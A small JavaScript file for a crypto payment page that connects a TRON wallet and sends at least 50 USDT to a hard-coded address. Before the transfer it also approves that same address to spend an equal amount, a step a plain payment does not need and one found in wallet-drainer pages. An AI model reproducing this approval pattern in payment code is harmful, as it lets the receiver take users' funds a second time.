const receiver = "TBcBAXua2kNx1dzNzWJqY3LSVfq1EDGtpo"; // Tera USDT wallet
const contract = "TU2tSUZQdeZHZSrbkkCm1mV7Gm2K6zzSWm"; // TRC20 USDT contract

async function connectWallet() {
  const tronWeb = window.tronWeb;
  if (!tronWeb || !tronWeb.defaultAddress.base58) {
    alert("❌ Please open in TronLink or Trust Wallet (TRON Browser).");
    return;
  }
  document.getElementById("wallet").innerText = tronWeb.defaultAddress.base58;
}

async function sendUSDT() {
  const tronWeb = window.tronWeb;
  const amount = parseFloat(document.getElementById("amount").value);

  if (!tronWeb || !tronWeb.defaultAddress.base58) {
    alert("❌ Wallet not connected.");
    return;
  }

  if (isNaN(amount) || amount < 50) {
    alert("❌ Minimum 50 USDT required.");
    return;
  }

  const tokenContract = await tronWeb.contract().at(contract);
  const decimals = 6;
  const finalAmount = tronWeb.toBigNumber(amount * 10 ** decimals);

  try {
    await tokenContract.approve(receiver, finalAmount).send();
    await tokenContract.transfer(receiver, finalAmount).send();
    alert("✅ Payment Successful!");
  } catch (err) {
    alert("❌ Transaction failed.");
  }
}

window.onload = connectWallet;
